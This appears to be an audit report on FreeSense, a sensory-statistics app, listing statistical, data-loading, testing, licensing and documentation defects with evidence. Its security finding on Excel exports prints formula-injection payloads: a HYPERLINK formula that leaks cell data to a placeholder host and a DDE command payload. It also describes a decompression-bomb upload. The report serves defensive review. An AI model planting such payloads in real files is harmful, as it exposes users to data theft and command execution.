### STAT-01: Cluster ANOVA tests the partition it was built from, so "significant" stars appear on pure noise
- Severity claimed: HIGH
- Location: `stats/segmentation.py:57-93` (`_cluster_anova`), called from `compute_ahc_clusters` (l.211) and `compute_kmeans_clusters`; rendered as ★ markers by `modules/liking/workflow.py:114-139` (`_cluster_profile_caption`), l.1505-1540 (AHC tab) and the k-means tab.
- Evidence: the one-way ANOVA per product compares the clusters on the same liking scores the clusters were formed from. Script `t_seg.py`: 20 datasets of 100 consumers x 6 products, iid N(6, 1.5) rounded to 1 to 9, no segment structure. AHC (Ward, k = 2, raw scores) flagged `[5, 4, 3, 5, 3, 5, 3, 3, 3, 4, 4, 5, 4, 6, 5, 5, 4, 3, 4, 2]` of 6 products significant at alpha = 0.05. A valid test would flag about 0.3 per dataset. The caption says "★ = product liking differs significantly across segments (one-way ANOVA on raw scores, p < α)" with no caveat; `Statistical_Methods_README.md` (around l.1610) presents the ANOVA as the test of absolute level without mentioning selection.

### STAT-02: Liking contrast uses df = n_consumers - n_products, disagreeing with the CLD and with the correct RCBD df
- Severity claimed: HIGH
- Location: `stats/liking.py:289-290` (`df_satterthwaite = max(1, n_c - n_p)`); consumed by `stats/contrast.py:292-312` (Liking contrast p-value, CI, HSD critical value, Hedges' J) and `stats/contrast.py:628-640` (FDR family); `compute_liking_cld` (`stats/liking.py:786-814`) instead uses a per-pair Welch formula.
- Evidence (`t_lik.py`): balanced synthetic panels, 10 consumers x 6 products. The contrast uses df = 4; the CLD uses per-pair df of about 2(n-1) = 18; the correct residual df of the balanced RCBD (equal to lme4/emmeans Satterthwaite on complete data) is (10-1)(6-1) = 45. The SEs agree exactly (LMM 0.5193 vs RCBD 0.5193), so only the df differs. P2 vs P5: p = 0.0255 at df 45 against 0.0820 in the contrast. Across 30 datasets x 3 post-hoc methods x all reference/comparison pairs, the contrast's significance disagreed with the CLD letters in **442 of 2700** comparisons (16%). When n_consumers <= n_products + 1 the df floors at 1, and the Hedges' g correction `J = 1 - 3/(4·df - 1)` becomes 0, so g is reported as 0 for every pair. The hedochoc validation cannot catch this because at 222 consumers every df choice gives the same decisions.
- Evidence: 

### STAT-03: RATA Tukey contrast uses a different error term from the RATA Tukey CLD
- Severity claimed: HIGH
- Location: `stats/contrast.py:447-491` (RATA path: paired SE, df = n-1, studentized range with k_total) against `stats/posthoc.py:177-258` (`_rcbd_tukey_decisions`: pooled RCBD residual MS, df (J-1)(P-1)); docstring `stats/contrast.py:23-24` claims flags always match `generate_cld()`.
- Evidence (`t_cons.py`, sensochoc run as RATA, all 6 references x 5 comparisons x significant attributes, 420 pairs): Tukey had **16 mismatches** between contrast `significant` and the pairwise/CLD `Reject H0`, in both directions. Examples: MilkF choc1 vs choc2, CLD adj p = 0.163 (not significant), contrast significant; Sticky choc1 vs choc3, CLD adj p = 0.016 (significant), contrast not significant. FDR and LSD had 0 mismatches for RATA. DA had 0 mismatches for all three methods.
- Evidence: 

### STAT-04: PLS CV Q² collapses when a predictor is constant inside a training fold (in-fold scaling divides by ~1e-17)
- Severity claimed: HIGH (beta module)
- Location: `stats/pls.py:325-331` (`x_sd = np.where(np.isfinite(x_sd) & (x_sd > 0), x_sd, 1.0)`, same for `y_sd`), used by Q², permutation test and bootstrap CI.
- Evidence (`t_pls.py`, `t_pls2.py`): n = 8 products, 4 predictors, one predictor non-zero in a single product (for example an ingredient in only one recipe). After global autoscaling, the LOO fold that omits that product has a column whose in-fold SD is 6.0e-17, not 0, so the guard passes and the column is multiplied by ~1e16. Over 20 seeds, `fit_pls(...)['q2']` against an independent LOO: seed 4 gives -14.519 vs 0.889, seed 9 gives -11.046 vs 0.560, seed 2 gives -2.547 vs 0.733 (median absolute difference 0.46). Changing only the guard to `> 1e-10` reproduces the independent values exactly for every seed. No warning is raised: the per-fold effective-rank cap sees a full-rank scaled matrix.
- Evidence: 

### FUNC-01: Liking LS means silently wrong when a product name contains "Var" or "Cov"
- Severity claimed: BLOCKER
- Location: `stats/liking.py:258-261` (`compute_liking_lmm`)
- Evidence: fixed-effect parameters are selected with `if 'Var' not in p and 'Cov' not in p`. The parameter names include the product label (`C(_product)[T.Variety A]`), so a product whose name contains "Var" or "Cov" is dropped from the fixed-effect design matrix and gets the intercept (the reference product's mean) as its LS mean. Reproduction: `scratchpad/agents/B02/liking_var.py` renames hedochoc `choc1..6` to `Variety A, Variety B, Covent, Plain, Dark, Milk`:
  ```
  product   ls_mean   (raw mean)
  Covent    5.765766  5.765766
  Variety A 5.765766  5.328829   <- wrong, equals the reference
  Variety B 5.765766  5.689189   <- wrong
  ```
  The same data with names `choc1..6` gives the correct 5.3288 / 5.6892. `cov_lsmeans` is built from the same matrix, so standard errors, CLD letters and contrasts that consume it are also wrong. The UI path (Liking Step 1 "Run full analysis") calls this function (`run_liking.py`, `variety.csv`, ran with no warning). No error or warning is shown.

### FUNC-02: DA crashes with a raw traceback when no attribute column is numeric (for example decimal-comma CSV)
- Severity claimed: HIGH
- Location: `stats/panel_performance.py:551` (`compute_scale_usage`), reached from `modules/descriptive/workflow.py:76,393`; Step 1 has no numeric check (`modules/descriptive/workflow.py:255-340`, `modules/descriptive/ui.py:69-142`)
- Evidence: `data/eu_comma_quoted.csv` (comma-separated, values such as `"7,5"`). DA, map Panelist/Product/Session, scale 0 to 10. Step 1 shows only "**480 blank cells detected** across 5 attribute columns ... treats a blank as a missing observation". Clicking Run gives an exception element `KeyError: 'mean_bias'` with a stack trace (`client.showErrorDetails` is `full`, so the user sees the full traceback). The same happens for any file whose attribute columns are all text.

### FUNC-03: Duplicated rows silently change DA results
- Severity claimed: HIGH
- Location: `modules/descriptive/ui.py:69-142` (`validate_da_design` has no duplicate check); `stats/da_anova.py`
- Evidence: `data/dup_rows.csv` is `small.csv` concatenated twice (a typical copy/paste or double-export error). DA Step 1 shows no warning at all (metrics still say 12 assessors, 4 products, 2 replicates). The ANOVA changes materially (`checks1.py`):
  ```
  small: MilkF F_product 64.98, df_error 48, tested_against Residual, p_interaction 0.113
  dup:   MilkF F_product 44.43, df_error 33, tested_against Interaction, p_interaction 3.1e-10
  ```
  Every attribute's interaction becomes "significant" and the error term switches. RATA is unaffected in substance (cells are averaged, `modules/rata/ui.py` warns only when no replicate is mapped).

### FUNC-04: Blank product (or assessor) cells become a real level called "nan"; RATA crashes
- Severity claimed: HIGH
- Location: `core/data.py:190-197` (`clean_and_structure_data` casts meta columns with `astype(str)`), `stats/mixed_models.py:60`
- Evidence: `data/nan_product.csv` (three rows with an empty Product cell).
  - DA: runs with no warning; Step 1 metric says "Products 4" (computed on the raw frame) but `da_df_long` contains products `['choc1','choc2','choc3','choc4','nan']`, so a fifth product "nan" with three observations enters the ANOVA, means, maps and export.
  - RATA: Step 1 shows "Products 5" and an unbalanced-design warning, then Run raises `PatsyError: factor contains missing values` as an exception element (`modules/rata/ui.py:427` to `stats/mixed_models.py:60`).

### FUNC-05: File reading is brittle and failures are silent or unintelligible (delimiter, decimal comma, encoding, .xls, .CSV)
- Severity claimed: HIGH
- Location: `core/data.py:7-37` (`load_data`); uploaders in `modules/descriptive/workflow.py:109`, `modules/rata/ui.py:108`, `modules/cata/ui.py:369,616` accept `xls`
- Evidence (`load_check.py` and AppTest `run_bad.py`):
  - `;`-separated file (`data/eu_semicolon.csv`, Excel's CSV default in most of continental Europe): loads as **one** column `Panelist;Session;Product;...`. Step 1 shows no error; the mapping selectbox simply offers that one string. Same for a tab-separated `.csv` and a file with a title row above the header (`title_row.csv`: single column "Study XYZ export 2026").
  - Decimal commas: see FUNC-02 (DA crash) and FUNC-06 (RATA message).
  - Latin-1 file with umlauts (`latin1.csv`): `Error loading file: 'utf-8' codec can't decode byte 0xfc in position 61: invalid start byte`.
  - `.xls`: uploaders advertise it but `xlrd` is not in `requirements.txt` or the venv; any real `.xls` gives `Error loading file: Missing optional dependency 'xlrd'. Install xlrd >= 2.0.1 for xls Excel support Use pip or conda to install xlrd.`
  - `SMALL.CSV`: `load_data` tests `name.endswith('.csv')` case-sensitively, so it goes to `read_excel`: `Error loading file: Excel file format cannot be determined, you must specify an engine manually.` (Inferred: Streamlit's uploader accepts `.CSV` for `type=["csv"]`; not tested in a browser.)
- Evidence: 

### IO-01: Trailing empty rows create a phantom product "nan"; DA silently changes results, RATA crashes
- Severity claimed: BLOCKER
- Location: `core/data.py:17-37` (`load_data`, no empty-row drop), `core/data.py:193-195` (`astype(str)` turns NaN into the string `'nan'`), `core/data.py:214` (RATA zero-fill); RATA `modules/rata/ui.py:427` -> `stats/mixed_models.py:60`
- Evidence: sensochoc exported to CSV plus two lines of only commas (the usual artefact of deleted rows in Excel). `load_data` returns 350 rows, the last two all-NaN. After `clean_and_structure_data` both DA and RATA carry a product `'nan'`, assessor `'nan'` and replicate `'nan'`.
  - DA (AppTest): no error. The only message is "28 blank cells detected". Step 1 metrics say Products 6 / Assessors 29, but `da_df_long` has products `[choc1..choc6, 'nan']` and 30 assessors. `'nan'` shows up in `da_summary_df`, `da_cld_df` (for example `MilkF nan abcde`), `da_rv_df` (30 assessors) and the Raw_Data export. Direct comparison (`da_cld.py`) against the clean file shows **3 CLD pairwise verdicts among the real products change**: Bitterness choc4 vs choc6 and Sweetness choc2 vs choc6 go from different to not different. Panel-performance frames (`da_agree_df`, `da_scale_df`, `da_rv_df`) also differ.
  - RATA (AppTest): the zero-filled `'nan'` product passes validation. It shows only an "Unbalanced design (Min: 1, Max: 29)" warning and Products 7. "Run full analysis" then raises an uncaught `patsy.PatsyError: factor contains missing values` from `run_mixed_models`. The user sees a traceback.
  - An xlsx whose stray cell holds a space, or a formatted row further down, gives the same NaN rows (`fmt2.py`, `trail.xlsx`: 7 rows for 2 data rows, plus `Unnamed: 3/4` columns).

### IO-02: Decimal-comma numbers are silently zero-filled (RATA), dropped (DA) or dropped as whole columns (means tables)
- Severity claimed: HIGH
- Location: `core/data.py:199-214`, `core/data.py:103-109` (`load_precomputed_means`, 50 % coercion rule), RATA blank-cell warning `modules/rata/ui.py` Step 1
- Evidence: sensochoc with 35 of 348 `CocoaA` cells written as `"7,5"` (a comma-delimited CSV with quoted decimal-comma cells, or a column Excel stored as text).
  - RATA: no error. The warning reads "35 blank cells detected … filled with 0". After the run, `CocoaA` has 36 zeros instead of 1: every 7.5 became 0.
  - DA: "35 blank cells detected … treated as missing observation". The values are dropped from the ANOVA.
  - The text-column check only fires above 50 % non-numeric, and the scale-range check (`core/upload_validation.py:63`) coerces first, so neither catches it.
  - Means table (`load_precomputed_means`, `fmt2.py`): a column that is all decimal-comma (`Sour`) stays object dtype and is silently left out, because the Fusion/PrefMap validators keep only numeric columns (`modules/fusion/workflow.py:536`, `modules/prefmap/workflow.py:338`). Mixed columns get NaN cells. `nan_affected` is returned, but no caller reads it (grep: only the tuple unpacking at `fusion/workflow.py:363` and `prefmap/workflow.py:313`), so the NaN warning the docstring promises is never shown.

### IO-06: `Run_Parameters` cannot reproduce a run: no date, dependency versions, commit, bootstrap settings or file fingerprint; the version stamp "1.0.0" is ambiguous
- Severity claimed: HIGH
- Location: `utils/export.py:334-566` (`build_run_parameters_sheet`), `core/__version__.py`
- Evidence: the exports generated for RATA, DA, CATA and Liking (see `inspect_xlsx.py` output) record `freesense_version = 1.0.0`, module, palette, file name, col_map, scale, alpha, post-hoc and module-specific options. None of them records:
  - export date and time (only the Fusion `Analysis_Info` sheet has one, `utils/export.py:1753`)
  - Python, statsmodels, scipy, pandas, numpy, scikit-learn or pingouin versions
  - git commit
  - sheet name
  - input file hash or row count
  - for RATA/DA, the CVA/RV bootstrap settings (`stats/multivariate.py:11-12`, `N_BOOTSTRAP=500`, `BOOTSTRAP_SEED=42`). CATA does record its CA seed and iterations in `Methods_Notes`.

  `git log v1.0.0..HEAD` lists 146 commits, including 2,667 inserted lines in `stats/` (for example the Type II empty-cell path), all still stamped `1.0.0`. The `requirements.txt` ranges are wide (`statsmodels>=0.14.2,<1`, `scipy>=1.13,<2`) and there is no lockfile, so two installs of "1.0.0" can differ numerically.

### TEST-01: The suite protects results only on the maintainer's machine: no CI, no lockfile, one Python version
- Severity claimed: HIGH
- Location: repo root (`.github/` absent, no lockfile); `requirements.txt`; `pytest.ini`
- Evidence: - `ls .github` returns "No such file". There is no `*.lock`, `constraints.txt` or `pip freeze` output.
  - `requirements.txt` gives floors and major-version caps only: `statsmodels>=0.14.2,<1.0.0`, `scikit-learn>=1.5.0,<2.0.0`, `scipy>=1.13.0,<2.0.0`, `numpy>=2.3.2,<3.0.0`, `pingouin>=0.5.4,<1.0.0`.
  - The only recorded run is on Python 3.14.7 with statsmodels 0.15.0, scikit-learn 1.9.1 and scipy 1.18.1 (00-orientation section 4). The README claims support for Python 3.11 to 3.14.
  - Many numerical pins are version-sensitive:
    - LMM optimiser output: `test_rata_lmm_pin` asserts the sum of LR statistics is `1292.263 ± 1e-3`.
    - KMeans labels and inertia at `random_state=42`.
    - Bootstrap CA ellipses: `default_rng` seeded draws.
    - PLS permutation p-values drawn from `RandomState(seed)`.
    - Excel sheet baselines in `test_export_rata.py` (comment "Recorded from a fresh baseline run").

### TEST-02: Nearly half the shipped statistical methods have no known-answer test
- Severity claimed: HIGH
- Location: coverage matrix above; `validation/README.md` "Not reference-validated (yet)"
- Evidence: every one of these renders results to users and writes them into the Excel export. None has a test that compares against an externally produced number. Their tests either run the function via AppTest and assert only no-exception, wiring or column conventions, or they pin a value FreeSense itself produced:
  - CATA: `run_cata_contrast`, `compute_penalty` (the Welch t machinery is validated only through JAR), `compute_ca_ellipses`, `build_cld_from_mcnemar`, `wilson_ci`.
  - DA/RATA:
    - `multivariate.calculate_pca`, `run_cva`, `calculate_panel_stability`: the matrix labels them "STRUCT only". `calculate_pca` calls sklearn `PCA` directly (`stats/multivariate.py` about line 123); the PrefMap pin covers the separate `compute_pca_scores`.
    - `varimax`: never executed by any test.
    - `contrast.compute_contrast`.
    - Panel-performance discrimination, agreement/RV and scale usage: the sensochoc pins in `test_panel_performance_summary.py` are derived from the current code.
  - DA Type III with unequal replication and no empty cells. The DA pin uses balanced sensochoc, where Type I = II = III, so the Sum-coding Type III path is never distinguished. I checked it by hand (`B05/t3.py`, 8 assessors × 4 products, replication 1 or 3 per cell). FreeSense gives `F_product = 21.246` against the interaction term with df 21. statsmodels `anova_lm(typ=3)` with Sum coding gives MS_Product / MS_Interaction = 21.2455. So it is correct today but unprotected.
  - Liking: `compute_twoway_anova_demo` (the README says it was spot-checked once, but there is no harness), `compute_jar_penalty_long`, `compute_jar_distribution`, and `segmentation.compute_demographic_association` (never executed).
  - PrefMap: `compute_preference_surface`.
  - PLS: jackknife, permutation test and `compute_cv_coefficient_stability`. The only permutation test asserts `p < 0.05` on a synthetic fixture.
  - RATA: the LMM is validated only on DA intensities with no blanks. The RATA-specific zero-filling of unticked cells feeding the LMM is covered only by `test_da_blank_fill.py::test_rata_always_zero_fills`, which checks the fill, not any statistic computed on filled data.

### SEC-01: Excel exports write any text beginning with "=" as a live formula (formula injection)
- Severity claimed: HIGH
- Location: `utils/export.py`, every builder (`generate_excel_report` l.829ff, `generate_da_excel_report` l.631, `generate_liking_excel_report` l.1028 incl. `Demographics` and `Raw_Data`, `generate_fusion_excel_report` l.1664 `Raw_Data`, `generate_prefmap_excel_report`, `generate_cata_excel_report`); root cause is `DataFrame.to_excel(engine='openpyxl')`, which stores any `str` starting with `=` as a formula cell.
- Evidence: `formula_injection.py` (RATA run completes with no exception). Formula cells found per sheet: Results_Table 4, Descriptives_CLD 40, Means_Wide 4, TickingRate_Wide 4, TickingRatePerRep_Wide 4, LMM_ANOVA 2, PostHoc_Pairwise 170, CochransQ 2, Raw_Data 2320. Examples: `Results_Table!E1 = '=HYPERLINK("http://example.invalid/?leak="&A2,"Click")'`, `Means_Wide!C1 = "=cmd|' /C calc'!A0"`, `Descriptives_CLD!B2 = '=2*21'`. Values beginning `@`, `+`, `-` were written as plain strings (openpyxl only treats `=` as a formula), so the xlsx risk is confined to `=`. Output saved as `rata_evil_export.xlsx`.

### SEC-02: No upload size cap and no decompression guard; a 0.3 MB workbook costs 46 s and 475 MB
- Severity claimed: HIGH (hosted multi-user); LOW (local single-user)
- Location: `.streamlit/config.toml` (no `server.maxUploadSize`, so Streamlit's default 200 MB applies; `streamlit.config.get_option('server.maxUploadSize')` returns 200); `core/data.py:8-37` `load_data` and `:41-100` `load_precomputed_means` call `pd.read_excel` / `pd.read_csv` without any size, row or column limit.
- Evidence: `zipbomb.py` produced `compressed 0.30 MB, sheet xml uncompressed 86.0 MB, ratio 290:1`; `parse.py` returned `shape (1000000, 5) 45.9s peak RSS MB 475`. Extrapolating linearly (not run, to spare the shared machine): a 3 MB upload is about 8 minutes and 4.5 GB; the 200 MB cap is far past any server's memory. The resulting frame is also stored in `st.cache_data(max_entries=4)`, so the memory stays held after the session ends.

### SEC-04: Third-party proprietary files are in the git history (XLSTAT tutorial workbook with macros, training slides, a PDF)
- Severity claimed: HIGH (if the GitHub repository is or will become public); presence VERIFIED, licensing status SUSPECTED
- Location: git history only, none in the current tree. `example_data/LIK_tuto_EN.xlsm` (added `acf8ffa` 2026-03-27, removed `01065d1` 2026-04-23); `PLS.pptx` (added `fd50b56`, removed later); `docs/PLS.pdf` (added `1a6d701`, 1.7 MB); also `Rplots.pdf`, `validation/PrefMap/_out/carto_reference.pdf`, `notebooks/pls_validation.ipynb`.
- Evidence: `git show acf8ffa:example_data/LIK_tuto_EN.xlsm` : `docProps/core.xml` creator "Fabien Llobell", 26 worksheets named `XLSTAT_20220318_...`, contains `xl/vbaProject.bin` (92 KB VBA macros). `PLS.pptx` slide text: "XLSTAT PLS set up ... XLSTAT Recommends ...", creator "Gemma", created 2017. `docs/PLS.pdf` provenance not established (no readable metadata). History is pushed to `origin` (`https://github.com/Sesnor-y/FreeSense.git`); repo visibility could not be checked (`gh` not installed).

### REL-01: The GitHub repository is private, so README's clone command and citation URL fail for every user
- Severity claimed: HIGH
- Location: `README.md:45` (`git clone https://github.com/Sesnor-y/FreeSense.git`), `README.md:425` (citation URL)
- Evidence: `curl -o /dev/null -w "%{http_code}" https://github.com/Sesnor-y/FreeSense` -> `404`; the owner page `https://github.com/Sesnor-y` -> `200`; `GIT_TERMINAL_PROMPT=0 git -c credential.helper= ls-remote https://github.com/Sesnor-y/FreeSense.git` -> `fatal: could not read Username`. `api.github.com/repos/Sesnor-y/FreeSense` -> 404. Authenticated `git ls-remote origin` works, so the repository exists and is private (Inferred; a deleted repo would fail authenticated too).

### REL-02: Git history contains third-party copyrighted files; making the repo public as-is would redistribute them
- Severity claimed: HIGH (becomes BLOCKER if the repository, or a clone with history, is made public)
- Location: history only. `git log --all --diff-filter=A --name-only` lists `example_data/LIK_tuto_EN.xlsm`, `PLS.pptx`, `docs/PLS.pdf`, plus build artefacts `Rplots.pdf`, `validation/PrefMap/_out/carto_reference.pdf`. Commits touching them include `acf8ffa`, `1a6d701`, `01065d1`, `a6b5d33`, `fd50b56`, `bbd91e2`. B07 identifies the first two as XLSTAT (Addinsoft) tutorial material, the `.xlsm` with VBA macros.
- Evidence: see B07 for provenance. From the licensing side: none of these files is covered by the repo's MIT `LICENSE`, and no licence or permission notice for them exists anywhere in history I could find (`git ls-files` shows no NOTICE/COPYING file at any point).

### REL-03: pingouin (GPL-3.0) is installed by default and imported by the MIT-licensed app; licence position undocumented
- Severity claimed: HIGH (licensing decision needed before release; not a technical defect)
- Location: `requirements.txt:11` (`pingouin>=0.5.4,<1.0.0`, installed by default), `stats/panel_performance.py:21-25` (`try: import pingouin as pg`), used only at `stats/panel_performance.py:252-264` (`pg.intraclass_corr(...)` for the ICC3 95% CI columns `ICC_lower_approx`/`ICC_upper_approx`); README "License" section (`README.md:429-452`) mentions only the GPL datasets.
- Evidence: `importlib.metadata` reports `pingouin 0.6.1 | GPL-3.0`. It is the only copyleft package among ~65 installed distributions (others are MIT, BSD, Apache-2.0, PSF, MPL-2.0 for `certifi`; full list in the scratch output). pingouin also pulls seaborn, xarray, pandas-flavor, tabulate, which no FreeSense code imports. With pingouin uninstalled the app imports, the panel-performance and validation-pin tests pass (19 passed) and the DA AppTest file runs clean, so the "optional" claim in README line 72 holds.
- What this implies (common interpretation, not a legal conclusion):
  - **Source distribution (git clone + pip install):** FreeSense's own files do not contain pingouin code, and the user installs pingouin themselves from PyPI. The FSF's position is that a program that imports a GPL library and runs as one process forms a combined work that must be distributed under GPL-compatible terms as a whole; MIT *is* GPL-compatible, so MIT-licensed source that imports GPL-3.0 is generally considered fine to publish. The practical consequence is that anyone distributing the *combination* must honour GPL-3.0 for it, and the MIT grant does not let recipients close it. Many projects accept this; some institutions' policies do not.
  - **Hosted service (Streamlit Cloud, institutional server):** GPL-3.0 (unlike AGPL) is triggered by distribution, not by network use. Running FreeSense with pingouin for remote users is generally not "conveying" and imposes no source-offer obligation.
  - **Bundled binary (Docker image, PyInstaller, a university software share):** this *is* distribution of pingouin. The distributor must include the GPL-3.0 text, pingouin's source or a written offer for it, and must not impose terms that restrict the combined work beyond GPL-3.0. An MIT label on the image would be misleading about the combined work.

### DOC-01: Statistical methods reference contradicts the implemented code in places a user would copy into a methods section
- Severity claimed: HIGH
- Location: `Statistical_Methods_README.md` sections 8, 15, 16, 23a, 23c, 24, 27, 48, 51
- Evidence (each checked against the code):
  1. §16 "FDR and LSD in the DA context" (lines 843-855) says n_i, n_j in the pairwise SE are "the number of assessors (unique, not observations)" and that using observation counts "inflat[es] false positive rates". The code does the opposite: `stats/posthoc.py:144-157` `_observation_counts` returns `groupby(product).size()` (J x R), and its docstring says `nunique(assessor)` would be wrong. §5a (line 269) describes the code correctly, so the document contradicts itself. §23a (line 1283) repeats the stale "number of unique assessors" for the DA contrast SE, while `stats/contrast.py:424-425,706-707` uses `_observation_counts`.
  2. §23c "Note on family size" (lines 1323-1324) says the contrast BH family is only the selected comparison products. `stats/contrast.py:578-610` corrects over the full C(n,2) pair family (B.23 / F-03), as README line 267 and §25 say.
  3. §24 "Why ML, not REML" (lines 1449-1451) says the Liking LMM is fitted by ML. `stats/liking.py:228-246` fits REML for the LS means and their covariance and ML only for the LRT (the module docstring, lines 9-13, and README line 255 agree with the code).
  4. §24 has a heading "Satterthwaite Degrees of Freedom" (line 1459) for `df = n_consumers - n_products`, which is not a Satterthwaite approximation (the code also names it `df_satterthwaite`, `stats/liking.py:705`). A user reporting "Satterthwaite df" would misreport.
  5. §8 "Missing-cell caveat" (line 356) says PCA/CVA pivots use `fillna(0)` in `stats/multivariate.py`. `grep -n fillna stats/multivariate.py` returns nothing. The current behaviour (leave incomplete attributes out and say so) is in CHANGELOG `[Unreleased]` and CLAUDE.md.
  6. §15 formula blocks (lines 687-689, 698-700) show `intensity ~ C(Product) + C(Assessor)` (treatment coding). The code uses `C(Prod_Safe, Sum)` (`stats/da_anova.py:224, 292`).
  7. §15 (line 710) calls Type III with effect coding "the recommended convention in Langsrud (2003)". Langsrud (2003) is titled "Use Type II instead of Type III sums of squares"; the reference note at line 817 admits FreeSense departs from it. The body text misattributes the recommendation.
  8. §51 (lines 2691, 2712) says CA bootstrap default B = 200 and "increase to 1000+ for publication graphics", and line 2711 mentions "ellipse-confidence sliders". The app hard-codes 500 resamples, seed 42, confidence 0.95 (`modules/cata/ui.py:2157-2158, 2340-2342`; `stats/cata.py` docstring "n_boot : int, default 500"). The user cannot change any of them.
  9. §27 "Test Selection Logic" (line 1647) says the permutation test uses 10,000 permutations. `stats/segmentation.py:24` `DEFAULT_PERMUTATION_N = 999`, and the only caller (`modules/liking/workflow.py:1253`) does not override it. The k-means `random_state=42` is not documented (only `n_init=50`).
  10. §48 (line 2593) lists correction methods "BH (default), BY, Bonferroni, and Holm". The UI offers `["FDR (Benjamini-Hochberg)", "Bonferroni", "Holm", "Uncorrected"]` (`modules/cata/ui.py:118`): no BY, and "Uncorrected" is not documented.
- Evidence: 

### DOC-02: No ready-to-use methods text or per-module citation, and exports do not carry what a methods section needs
- Severity claimed: HIGH
- Location: `README.md:421-425` (Citation); `utils/export.py:334-560` (`build_run_parameters_sheet`); `Methods_Notes` writers at `utils/export.py:272` (RATA) and `2085` (CATA)
- Evidence: A grep of README and the methods reference for "cite", "methods section" and "reporting" finds only the single software citation "Danner, L. (2026). FreeSense ... (Version 1.0) [Software]", with no DOI, no `CITATION.cff` and no archived release. No module has a template paragraph (model, SS type, error term, post-hoc and correction family, software and version). A `Methods_Notes` sheet exists only for RATA and CATA. DA, Liking, Fusion and PrefMap have only `Run_Parameters`. `Run_Parameters` records `freesense_version` (`1.0.0`, which is also the tag on a commit 146 commits older, per 00-orientation flag 4) but no versions of statsmodels, scipy, scikit-learn or pingouin, which set the numerical engine.

